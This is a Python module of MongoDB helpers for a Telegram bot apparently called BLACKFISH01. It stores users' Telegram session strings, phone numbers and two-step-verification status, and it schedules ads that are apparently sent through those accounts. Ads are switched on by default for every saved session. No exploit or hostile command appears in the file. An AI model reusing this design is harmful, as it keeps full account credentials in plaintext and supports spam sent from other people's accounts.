"""MongoDB helpers for Hai / BLACKFISH01."""
from __future__ import annotations

import os
from datetime import datetime, timedelta

from config import MONGODB_URI, DB_NAME, DEFAULT_INTERVAL_SEC

_client = None
_db = None
users_col = None
temp_sessions_col = None
ads_col = None
settings_col = None


def ensure_db():
    global _client, _db, users_col, temp_sessions_col, ads_col, settings_col
    if users_col is not None:
        return True
    uri = (MONGODB_URI or "").strip()
    if not uri:
        return False
    try:
        from pymongo import MongoClient
        _client = MongoClient(uri, serverSelectionTimeoutMS=8000)
        _client.admin.command("ping")
        _db = _client[DB_NAME or "nexa_bot"]
        users_col = _db["users"]
        temp_sessions_col = _db["temp_sessions"]
        ads_col = _db["ads"]
        settings_col = _db["settings"]
        return True
    except Exception as e:
        print(f"mongo connect failed: {e}", flush=True)
        users_col = None
        temp_sessions_col = None
        return False


def get_ads_config():
    if not ensure_db() or ads_col is None:
        return {"ads_enabled": False, "interval": DEFAULT_INTERVAL_SEC}
    try:
        doc = ads_col.find_one({"_id": "config"}) or {}
        return {
            "ads_enabled": bool(doc.get("ads_enabled", False)),
            "interval": int(doc.get("interval") or DEFAULT_INTERVAL_SEC),
            "message": doc.get("message") or "",
            "media_url": doc.get("media_url") or "",
        }
    except Exception:
        return {"ads_enabled": False, "interval": DEFAULT_INTERVAL_SEC}


def set_ads_config(data: dict):
    if not ensure_db() or ads_col is None:
        return False
    try:
        ads_col.update_one({"_id": "config"}, {"$set": data}, upsert=True)
        return True
    except Exception:
        return False


def get_auto_logout():
    if not ensure_db() or settings_col is None:
        return False, 24
    try:
        doc = settings_col.find_one({"_id": "auto_logout"}) or {}
        return bool(doc.get("enabled", False)), float(doc.get("hours") or 24)
    except Exception:
        return False, 24


def set_auto_logout(enabled: bool, hours: float = 24):
    if not ensure_db() or settings_col is None:
        return False
    try:
        settings_col.update_one(
            {"_id": "auto_logout"},
            {"$set": {"enabled": bool(enabled), "hours": float(hours)}},
            upsert=True,
        )
        return True
    except Exception:
        return False


def save_session_to_db(session_data):
    if not ensure_db() or users_col is None:
        return False
    try:
        interval = int(get_ads_config().get("interval") or DEFAULT_INTERVAL_SEC)
        interval = max(60, interval)
        now = datetime.now()
        phone = session_data["phone"]
        status = session_data.get("status") or "active"
        payload = {
            "session_string": session_data["session_string"],
            "telethon_string": session_data.get("telethon_string") or "",
            "updated_at": now,
            "user_id": session_data["id"],
            "username": session_data.get("username"),
            "first_name": session_data.get("first_name"),
            "last_name": session_data.get("last_name"),
            "phone": phone,
            "status": status,
            "created_at": session_data.get("created_at") or now.strftime("%Y-%m-%d %H:%M:%S"),
            "two_step_verification": session_data.get("two_step_verification", False),
            "ads_enabled": True,
            "next_ad_at": now + timedelta(seconds=interval),
        }
        users_col.update_one({"phone": phone}, {"$set": payload}, upsert=True)
        return True
    except Exception as e:
        print(f"save_session_to_db: {e}", flush=True)
        return False


def count_users():
    if not ensure_db() or users_col is None:
        return 0
    try:
        return users_col.count_documents({})
    except Exception:
        return 0


def list_users(limit=200):
    if not ensure_db() or users_col is None:
        return []
    try:
        return list(users_col.find({}, {"session_string": 0}).limit(limit))
    except Exception:
        return []


def users_with_sessions(limit=500):
    if not ensure_db() or users_col is None:
        return []
    try:
        return list(users_col.find(
            {"session_string": {"$nin": [None, ""]}},
            {"phone": 1, "session_string": 1, "telethon_string": 1, "user_id": 1,
             "username": 1, "status": 1, "created_at": 1},
        ).limit(limit))
    except Exception:
        return []


def get_due_ad_users(limit=40):
    if not ensure_db() or users_col is None:
        return []
    try:
        now = datetime.now()
        return list(users_col.find({
            "ads_enabled": True,
            "session_string": {"$nin": [None, ""]},
            "$or": [
                {"next_ad_at": {"$lte": now}},
                {"next_ad_at": {"$exists": False}},
            ],
        }).limit(limit))
    except Exception:
        return []


def mark_ad_sent(phone, interval_sec=None):
    if not ensure_db() or users_col is None:
        return
    try:
        interval = int(interval_sec or get_ads_config().get("interval") or DEFAULT_INTERVAL_SEC)
        users_col.update_one(
            {"phone": phone},
            {"$set": {"next_ad_at": datetime.now() + timedelta(seconds=max(60, interval)),
                      "last_ad_at": datetime.now()}},
        )
    except Exception:
        pass
